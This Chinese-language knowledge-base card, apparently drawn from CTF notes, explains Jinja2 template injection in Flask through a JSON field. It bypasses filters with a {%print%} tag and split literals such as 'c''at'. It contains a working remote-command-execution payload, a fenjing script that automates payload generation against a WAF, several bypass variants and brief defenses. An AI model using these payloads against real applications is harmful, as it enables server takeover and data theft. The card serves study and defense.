---
id: web-python-ssti-jinja2-print-tag-adjacent-literal-json-cmd
title: JSON 参数进入 Jinja2：用 {%print%} 语句块替代 {{ }}、相邻字符串 'c''at' 绕过关键字过滤执行命令
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-ssti-print-tag-adjacent-literal-waf-bypass
tags:
- jinja2
- ssti
- flask
- waf-bypass
- json
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-24
  verified_at: '2026-11-08T13:32:28+08:00'
  notes: 已对照原文核对：JSON body cmd参数(图27)、{% %}语句块可达(图28 unknown tag报错)、最终{%print g.pop...popen('c''at /flag')%}拿flag(图30)全支撑；dedup_review对web-generic-ssti-waf-string-concat(入口/语句块差异)成立；CTF题无受影响版本；卡无sources字段；未验证点：PoC未执行
url: /docs/web/python/ssti/web-python-ssti-jinja2-print-tag-adjacent-literal-json-cmd/
draft: false
kb_aliases:
- '{%print%} SSTI'
- Jinja2 print 标签绕过
- 相邻字符串绕过 cat 过滤
- JSON body SSTI
---

## 一句话结论

当 JSON 请求体字段被 `render_template_string` 渲染时，`{{ }}` 被拦可改用 `{%print ...%}` 语句块，`cat` 被拦可用相邻字符串 `'c''at'`——Python 词法在解析期自动拼接，源码不含连续 `cat` 子串但运行结果仍是 `cat`，最终 `os.popen(...).read()` 执行命令。

## 原理

- Flask 的 `render_template_string` 把输入当 Jinja2 模板解析；`{{ expr }}` 是输出表达式，`{%print expr %}` 是语句块，两者都能求值任意 Python 表达式，只是语法入口不同，多数 WAF 规则只盯着 `{{`。
- Jinja2 表达式复用 Python 词法：相邻字符串字面量在编译期拼接，`'c''at'` 与 `'cat'` 等价；按子串匹配 `cat` 的黑名单看不到连续三字符。
- 载荷链借 Jinja2 全局 `g` 拿到 `__globals__` → `__builtins__` → `__import__('os')` → `popen(...)`，读到命令输出直接回显。
- JSON body 场景下常规 GET 参数扫描/fenjing 直接梭哈不适用，需要自定义 WAF oracle（回包是否含标记）再生成 payload。

## 触发条件

- 用户可控输入被拼接进 Jinja2 模板（非渲染模板文件）。
- 存在关键字/分隔符黑名单但未做沙箱，且未禁用 `{%` 语句块。
- 攻击者可控制 JSON 字段并读到回显。

## 利用步骤

1. 提交 `{{7*7}}` 观察是否回显 49，确认模板注入。
2. 提交 `{{ config.items() }}` 被拦（返回「被屏蔽」），改 `{% config.items() %}` 得到模板解析错误 `unknown tag 'config'`，确认 `{% %}` 未被过滤。
3. 构造 `{%print ...%}` 载荷，`cat` 用 `'c''at'` 拆分。
4. 读取回显。

## PoC

```json
{"cmd":"{%print g.pop.__globals__.__builtins__.__import__('os').popen('c''at /flag').read()%}"}
```

自动化 WAF oracle（fenjing）：

```python
import functools, requests, fenjing

@functools.lru_cache(10000)
def waf(payload):
    r = requests.post(URL, json={"cmd": "tt" + payload})
    return "tt" in r.text

gen = fenjing.full_payload_gen.FullPayloadGen(waf)
payload, _ = gen.generate("os_popen_read", "cat /flag")
print(payload)
```

## 变体与关联

- 若 `print` 也被拦，可用 `{%set x=...%}` 或 `{{...|attr(...)}}` 构造。
- 相邻字面量拆分同样适用于 `os`、`popen`、`flag` 等关键字；命令侧可用 `/f*` 通配。
- 相邻字面量基础技巧见 [[web-python-ssti-jinja2-adjacent-literal-flask-session-forge]]，本卡差异在于入口是 JSON body 且用 `{%print%}` 语句块替代被拦的 `{{ }}`。

## 检测与防御

- 不要把用户输入交给 `render_template_string`；必须渲染时改用固定模板 + 变量绑定。
- 禁用/限制 `{%` 语句块，使用 Jinja2 SandboxedEnvironment。
- WAF 规则需覆盖 `print` 标签、相邻字面量、`attr`、`[]` 访问等变体。
